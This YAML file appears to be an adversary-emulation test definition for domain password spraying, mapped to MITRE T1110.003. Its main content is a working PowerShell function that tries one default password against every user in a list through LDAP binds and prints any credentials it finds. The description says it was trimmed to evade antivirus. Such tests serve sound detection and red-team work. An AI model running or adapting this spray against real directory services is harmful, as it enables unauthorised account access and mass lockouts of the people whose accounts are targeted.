api_version: "2.0"
name: Password Spray Invoke-DomainPasswordSpray Light
description: "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n"
args:
    - name: user_limit
      type: integer
      default: "200"
    - name: password
      type: string
      default: Spring2020
uuid: b15bc9a5-a4f3-4879-9304-ea0011ace63a
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.003: Password Spraying'
requirements:
    platforms:
        - os: windows
steps:
    - name: password-spray-invoke-domainpasswordspray-light
      inline: |
        function Invoke-dpsLight ($Password, $userlist) {
        $users = Get-Content $userlist
        $Domain = "LDAP://" + ([ADSI]"").distinguishedName
        foreach ($User in $users) {
          $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
          if ($Domain_check.name -ne $null) {
            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
          }
          else { Write-Host ". " -NoNewline}
        }
        Write-Host -ForegroundColor green "Finished"
        }
        Invoke-dpsLight "{{.Args.password}}" $env:Temp\usersdpsLight.txt
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
